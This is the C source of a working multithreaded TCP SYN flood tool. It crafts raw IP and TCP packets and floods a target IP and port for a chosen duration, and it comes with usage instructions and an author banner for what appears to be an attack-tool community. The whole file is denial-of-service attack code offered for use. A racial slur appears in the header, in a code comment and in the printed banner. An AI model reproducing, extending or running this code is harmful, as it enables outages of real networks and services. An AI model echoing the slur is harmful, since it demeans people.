/*
 * TCP Socket Flood - Standalone x86/x64
 * by c0re_x64 for 0v.lol // nigga
 * usage: sudo ./socket <ip> <port> <threads> <duration> [--pool N] [--size N]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>

struct socket_config {
    char target_ip[32];
    uint16_t target_port;
    uint32_t threads;
    uint32_t duration;
    uint8_t ip_tos, ip_ttl;
    uint16_t sport, dport;
    int data_len, pool_size;
    volatile uint8_t running;
    uint64_t total_packets, total_bytes;
};

struct conn_pool { int fd; uint32_t target_ip; uint16_t target_port; uint32_t seq; uint32_t ack; };

static struct socket_config config;
static pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
static uint32_t rand_state[4];

static void rand_init(void) {
    rand_state[0] = time(NULL); rand_state[1] = getpid() ^ getppid();
    rand_state[2] = clock(); rand_state[3] = rand_state[2] ^ rand_state[1];
}

static uint32_t rand_next(void) {
    uint32_t t = rand_state[0]; t ^= t << 11; t ^= t >> 8;
    rand_state[0] = rand_state[1]; rand_state[1] = rand_state[2];
    rand_state[2] = rand_state[3]; rand_state[3] ^= rand_state[3] >> 19; rand_state[3] ^= t;
    return rand_state[3];
}

static uint32_t get_local_ip(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return 0;
    struct sockaddr_in svr = { .sin_family = AF_INET, .sin_addr.s_addr = inet_addr("8.8.8.8"), .sin_port = htons(53) };
    if (connect(s, (struct sockaddr *)&svr, sizeof(svr)) < 0) { close(s); return 0; }
    struct sockaddr_in local;
    socklen_t len = sizeof(local);
    if (getsockname(s, (struct sockaddr *)&local, &len) < 0) { close(s); return 0; }
    close(s);
    return local.sin_addr.s_addr;
}

static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;
    for (; count > 1; count -= 2) sum += *addr++;
    if (count == 1) sum += (char)*addr;
    sum = (sum >> 16) + (sum & 0xFFFF); sum += (sum >> 16);
    return ~sum;
}

static uint16_t checksum_tcp(struct iphdr *iph, struct tcphdr *tcph, uint16_t data_len, int len) {
    const uint16_t *buf = (uint16_t *)tcph; uint32_t sum = 0;
    while (len > 1) { sum += *buf++; len -= 2; }
    if (len == 1) sum += *((uint8_t *)buf);
    sum += (iph->saddr >> 16) & 0xFFFF; sum += iph->saddr & 0xFFFF;
    sum += (iph->daddr >> 16) & 0xFFFF; sum += iph->daddr & 0xFFFF;
    sum += htons(IPPROTO_TCP); sum += data_len;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

// nigga socket flood
static void* socket_thread(void *arg) {
    int tid = *(int *)arg; free(arg);
    int raw = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw < 0) { fprintf(stderr, "[%d] raw\n", tid); return NULL; }
    int one = 1;
    setsockopt(raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(raw, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    uint32_t target = inet_addr(config.target_ip);
    uint32_t local = get_local_ip();
    if (!local) { fprintf(stderr, "[%d] no local ip\n", tid); close(raw); return NULL; }
    struct conn_pool *pool = calloc(config.pool_size, sizeof(struct conn_pool));
    if (!pool) { close(raw); return NULL; }
    for (int i = 0; i < config.pool_size; i++) { pool[i].fd = -1; pool[i].seq = rand_next(); }
    uint64_t pkts = 0, bytes = 0;
    time_t end = time(NULL) + config.duration;
    printf("[thread %d] started\n", tid);
    while (config.running && time(NULL) < end) {
        for (uint32_t t = 0; t < config.threads; t++) {
            int idx = rand_next() % config.pool_size;
            char pkt[2048];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));
            uint16_t sp = (config.sport == 0xFFFF) ? (rand_next() % 60000 + 1024) : config.sport;
            uint16_t dp = (config.dport == 0xFFFF) ? 80 : config.dport;
            uint32_t seq = pool[idx].seq;
            iph->version = 4; iph->ihl = 5; iph->tos = config.ip_tos;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
            iph->id = htons(rand_next() & 0xffff); iph->frag_off = htons(0x4000);
            iph->ttl = config.ip_ttl; iph->protocol = IPPROTO_TCP; iph->check = 0;
            iph->saddr = local; iph->daddr = target;
            tcph->source = htons(sp); tcph->dest = htons(dp);
            tcph->seq = htonl(seq); tcph->ack_seq = 0; tcph->doff = 5;
            tcph->syn = 1; tcph->ack = tcph->psh = tcph->rst = tcph->fin = tcph->urg = 0;
            tcph->window = htons(65535); tcph->check = 0; tcph->urg_ptr = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = checksum_tcp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
            struct sockaddr_in dst = { .sin_family = AF_INET, .sin_addr.s_addr = target, .sin_port = htons(dp) };
            int sent = sendto(raw, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&dst, sizeof(dst));
            if (sent > 0) { pkts++; bytes += sent; }
            pool[idx].seq = seq + 65;
        }
        usleep(rand_next() % 201);
    }
    pthread_mutex_lock(&stats_mutex);
    config.total_packets += pkts; config.total_bytes += bytes;
    pthread_mutex_unlock(&stats_mutex);
    printf("[thread %d] stopped %llu %llu\n", tid, (unsigned long long)pkts, (unsigned long long)bytes);
    free(pool); close(raw);
    return NULL;
}

static void sigint_handler(int sig) { (void)sig; config.running = 0; }

int main(int argc, char **argv) {
    if (argc < 5) { printf("socket <ip> <port> <threads> <duration> [--pool N][--size N]\n"); return 1; }
    if (geteuid() != 0) { fprintf(stderr, "root\n"); return 1; }
    memset(&config, 0, sizeof(config));
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
    config.target_port = atoi(argv[2]); config.threads = atoi(argv[3]); config.duration = atoi(argv[4]);
    config.ip_ttl = 64; config.sport = 0xFFFF; config.dport = config.target_port;
    config.data_len = 1024; config.pool_size = 16; config.running = 1;
    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--tos") == 0 && i+1 < argc) config.ip_tos = atoi(argv[++i]);
        else if (strcmp(argv[i], "--ttl") == 0 && i+1 < argc) config.ip_ttl = atoi(argv[++i]);
        else if (strcmp(argv[i], "--sport") == 0 && i+1 < argc) config.sport = atoi(argv[++i]);
        else if (strcmp(argv[i], "--dport") == 0 && i+1 < argc) config.dport = atoi(argv[++i]);
        else if (strcmp(argv[i], "--size") == 0 && i+1 < argc) config.data_len = atoi(argv[++i]);
        else if (strcmp(argv[i], "--pool") == 0 && i+1 < argc) config.pool_size = atoi(argv[++i]);
    }
    if (config.threads < 1 || config.threads > 256 || config.duration < 1) return 1;
    rand_init();
    signal(SIGINT, sigint_handler); signal(SIGTERM, sigint_handler);
    printf("\n  ____        _       _        _\n");
    printf(" / ___|  ___ | | ___ | |_ ___ | |\n");
    printf(" \\___ \\ / _ \\| |/ _ \\| __/ _ \\| |\n");
    printf("  ___) | (_) | |  __/| || (_) |_|\n");
    printf(" |____/ \\___/|_|\\___| \\__\\___/(_)\n");
    printf(" Socket Flood - by c0re_x64 for 0v.lol // nigga\n\n");
    pthread_t *threads = malloc(config.threads * sizeof(pthread_t));
    if (!threads) return 1;
    for (uint32_t i = 0; i < config.threads; i++) {
        int *p = malloc(sizeof(int)); *p = i + 1;
        pthread_create(&threads[i], NULL, socket_thread, p);
        usleep(100000);
    }
    for (uint32_t i = 0; i < config.threads; i++) pthread_join(threads[i], NULL);
    free(threads);
    printf("\n[*] done %llu %llu\n", (unsigned long long)config.total_packets, (unsigned long long)config.total_bytes);
    return 0;
}
